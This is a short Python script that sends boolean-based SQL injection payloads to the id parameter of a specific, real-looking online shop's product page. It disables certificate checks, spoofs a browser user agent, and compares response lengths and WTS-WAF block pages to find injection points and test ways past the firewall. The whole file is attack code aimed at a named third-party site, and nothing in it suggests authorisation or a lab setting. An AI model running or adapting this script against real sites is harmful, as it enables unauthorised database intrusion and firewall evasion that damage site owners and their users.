#!/usr/bin/env python3
import urllib.request, urllib.parse, ssl
ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {'User-Agent': 'Mozilla/5.0'}
BASE = 'http://www.yijingweb.com/webmall/detail.php?id='

def q(payload):
    url = BASE + urllib.parse.quote(payload, safe='')
    try:
        r = urllib.request.urlopen(urllib.request.Request(url, headers=UA), timeout=12, context=ctx)
        b = r.read(60000).decode('utf-8','ignore')
        return len(b), 'WAF' if 'WTS-WAF' in b else 'OK'
    except urllib.error.HTTPError as e:
        b = e.read(60000).decode('utf-8','ignore')
        return len(b), 'WAF' if 'WTS-WAF' in b else ('H%d' % e.code)
    except Exception:
        return 0, 'ERR'

tests = [
    ('1=1 hash', "687' and if(1=1,687,0)#"),
    ('1=2 hash', "687' and if(1=2,687,0)#"),
    ('1=1 dash', "687' and if(1=1,687,0)-- "),
    ('1=2 dash', "687' and if(1=2,687,0)-- "),
    ('sqli报错', "687'"),
    ('正常687', "687"),
]
for name, p in tests:
    print('%s -> %s' % (name, q(p)))
